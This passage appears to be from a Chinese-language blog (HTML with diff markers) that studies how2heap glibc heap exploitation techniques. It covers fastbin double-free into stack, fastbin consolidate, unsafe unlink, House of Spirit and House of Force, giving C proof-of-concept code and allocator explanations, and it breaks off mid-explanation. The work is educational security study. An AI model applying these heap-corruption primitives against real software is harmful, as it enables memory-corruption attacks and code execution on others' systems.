class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到之前的操作没变，都是先利用了double free使得fastbin呈现环状，此时的环应该是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>&lt;-&gt;<span class="number">0x602020</span>]</span><br></pre></td></tr></table></figure>
+<p>后面的操作就很有意思了，先是malloc了两次，那第一个分配的就应该是0x602000，第二个就是0x602020，接着它就改了d的值，很显然修改的就是它的fd指针的值，那当我们再次malloc时，就会产生很神奇的情况：我们再次分配了0x602000，但是由于fd是stack，所以进入fastbin的成了stack而不是0x602020，环就被打破了，当我们再次malloc，我们就实现了malloc了stack的地址。</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j05x5j2j30ko02qmy7.jpg" alt="image-20190116165415679"></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz8j0ks84bj30g6020mxi.jpg" alt="image-20190116165439383"></p>
+<p>可以看到情况确实和我们想的一样，原理就是这样了，再看看具体的实现细节。我们先是定义了一个局部变量，我们都知道局部变量是在栈上的，然后取地址，再让地址减去chunk的大小，这是为什么呢？我们之前的操作可以注意到，实际上malloc返回的并不是我们实际分配空间的起始部分，它跳过了chunk的固有信息（如size），直接从内容处开始，所以d作为一个指向内容的指针，我们同样需要把我们伪造的空间的内容部分给他，而这一部分在malloc的空间没有被实际的数据填充时，也就是fd指针。</p>
+<p>还有一个问题是为什么stack变量要赋予0x20的初始值呢？这是为了伪造chunk的curSize部分，也就是我们常说的那3个bit的flag位，当然0x21也可以（0x21是理论上最正确的）</p>
+<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先malloc了两次，分配的地址分别为0x602000、0x602050两个，接着free第一个，此时的fastbin即为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
+<p>接着malloc了一个较大的内存空间，为0x6020b0，此时就是重点了。当glibc在分配一个large chunk时会检查是否存在fastbin，如果有的话，就会合并到unsortedbin中，再根据大小插入smallbin或者largebin，这就是所谓的consolidate。</p>
+<p>此时bin的状态如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin = []</span><br><span class="line">smallbin = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
+<p>由于0x602000不再fastbin的top了，所以又可以free了，这样0x602000就又到了fastbin里了，接下来再malloc</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz9volw1hhj30f80ektcr.jpg" alt="image-20190117205810704"></p>
+<p>此时malloc先分配了fastbin中的0x602000，接着再malloc第二次</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9vp7x2wrj30ay0100ss.jpg" alt="image-20190117205859176"></p>
+<p>可以看到分配还是0x602000，这次分配的实际上是我们的smallbin里的</p>
+<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><p>了解这个首先需要复习一下基础的知识了，首先回顾一下chunk的结构：</p>
+<ul>
+<li><p>当我们的chunk被分配之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---------------------malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">-------------user data,size == malloc size --------------   &lt;--malloc return address</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当我们的chunk free后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------------------free malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">---------Forward pointer to next chunk in list ----------</span><br><span class="line">---------Back pointer to previous chunk in list ---------</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>第二个问题就是什么是unlink，unlink指的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。比如说图中三个chunk，我们现在要拿走p</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9wejz57pj30e70bbmyp.jpg" alt="2"></p>
+<p>这时就有unlink操作了，其操作就是数据结构中学习的链表元素的删除</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd-&gt;bk = p-&gt;bk</span><br><span class="line">p-&gt;bk-&gt;fd = p-&gt;fd</span><br></pre></td></tr></table></figure>
+<p>当然我们可以看看unlink的代码，它并不是这么无脑的就进行了，它还会进行检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</span><br></pre></td></tr></table></figure>
+<p>当然这个检查我们非常容易绕过，我们的fd和bk都可以是非法的，只要fd-&gt;bk和bk-&gt;fd又指回了p就可以了</p>
+<p>了解了这些后我们就开始看代码了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序首先malloc了chunk0和chunk1，接下来对chunk0的offset2、3处做了赋值操作，根据上面的chunk结构我们很明显可以看出这是在user data里面选择了一片空间进行操作，它特意隔开了两个size，这两个size也就是一个正常的chunk所需的header部分，也就是说我们在伪造一个chunk（这个程序留出来的两个size真正的用处是实现该处地址的读写）。</p>
+<p>接下来程序修改了chunk1的内容，首先通过chunk1_ptr - header_size的方式找到了chunk1_header地址（这里的2实际上是2*sizeof(ptr)），接下来的任务就简单了，将prev_size改为我们malloc的size，而将chunk_size的后三位flag进行修改，将上一个chunk视为free可合并状态。</p>
+<p>如此，在free chunk1时，我们伪造的chunk0由于同样是free状态，就会发生合并，而合并的过程如下（以下的chunk0指我们伪造的chunk0，true_chunk是我们真的chunk0）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD == chunk0-&gt;fd == true_chunk - 3*size</span><br><span class="line">FD-&gt;bk == true_chunk </span><br><span class="line">true_chunk --&gt; chunk0</span><br></pre></td></tr></table></figure>
+<p>那也就是说，我们将chunk0设置为目的地址，也就是true_chunk[3]，就可以通过true_chunk[0]来修改里面的内容了，这也就是为什么最后程序成功修改了victim_string的原因。</p>
+<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>house_of_Spirit技术大概上讲的是将已经存在的指针指向我们伪造的chunk（可以位于堆栈、BSS段等等），之后欺骗glibc的相关检查，free进入bin</p>
+<p>由于how2heap上的代码有点太多了，所以这里我们用一个简单的demo先来学习一下，代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> pre_size;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> <span class="title">fake_chunks</span>[2];</span></span><br><span class="line"><span class="keyword">void</span> *ptr,*victim;</span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">fake_chunks[<span class="number">0</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">fake_chunks[<span class="number">1</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">ptr=(<span class="keyword">void</span> *)&amp;fake_chunks[<span class="number">0</span>].fd;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">victim=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到首先我们在栈上分配了两个我们自己定义的chunk，接着malloc了真的，之后设置了自定义chunk的size的值，free了我们自定义的chunk，再次malloc时，我们会发现victim就是我们伪造的chunk了。</p>
+<p>那么问题来了，为什么我们在伪造chunk的时候只是设置了size部分呢？这就要读一下free相关的源码了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_fRE</span><span class="params">(Void_t* mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);    <span class="comment">//找到了mem的chunk地址</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))   <span class="comment">//检查chunk的mmp位</span></span><br><span class="line">    &#123;</span><br><span class="line">        munmap_chunk(p);       <span class="comment">//用unmmap的方式取消映射</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ar_ptr = arena_for_chunk(p);  <span class="comment">//找到chunk对应的area</span></span><br><span class="line">    ...</span><br><span class="line">    _int_free(ar_ptr, mem);       <span class="comment">//调用init_free（）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _int_free(mstate av, Void_t* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p;</span><br><span class="line">    INTERNAL_SIZE_T size; </span><br><span class="line">    mfastbinptr* fb; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);   <span class="comment">//找到了mem的chunk</span></span><br><span class="line">    size = chunksize(p);   <span class="comment">//获得chunk的size</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast))    <span class="comment">//当前chunk的size字段的比较，不能超过fastbin的最大值</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || __builtin_expect(chunksize(chunk_at_offset(p, size))</span><br><span class="line">                                            &gt;= av-&gt;system_mem, <span class="number">0</span>))            <span class="comment">//比较下一个chunk的size字段，2*SIZE_ZE&lt;chunksize&lt;av-&gt;system_mem</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">        ...</span><br><span class="line">        p-&gt;fd = *fb;</span><br><span class="line">        *fb = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>试了一下这个简单的demo之后再去看how2heap上的代码就很简单了，同样是伪造chunk，不过就是伪造chunk的手段不一样（how2heap中运用了一个较大的数组人工划分了两个chunk）。</p>
+<p>还有一点就是两个例子中的size都不大，这是为了free后进入的是fastbin，前面free的源码中也表明了，如果你的size不够fastbin要求的话是根本没法触发之后的操作的。</p>
+<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><p>主要是针对top chunk，通过修改top chunk来malloc任意地址</p>
+<p>还是先看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">"This is a string that we want to overwrite."</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Its current value is: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">	*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line">	<span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个例子的目的就是改写我们一开始的变量bss_var的值，首先我们malloc了p1，然后通过了计算得到了top的地址。这怎么算出来的呢？我们都知道malloc返回的地址并不是真正的chunk起始地址，而是chunk除去了chunk header的部分，所以我们先先去2*size得到chunk的真正地址，接着再算一下chunk的real size（也就是chunk实际用的大小加上chunk header的大小），二者相加就得到了top的地址。当然实际上算的时候没这么麻烦。。。那我们就可以构想一下了，假如我现在想要malloc返回任意的地址，以上述代码中的bss_var为例，那我的目标就是应该malloc时，top_chunk恰好等于我的地址，所以我们首先需要一个构造一个evil_size使得malloc(evil_Size)后我们的top chunk恰好到了我们想让它到的地方，而这个</p>
+<p>。。。。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
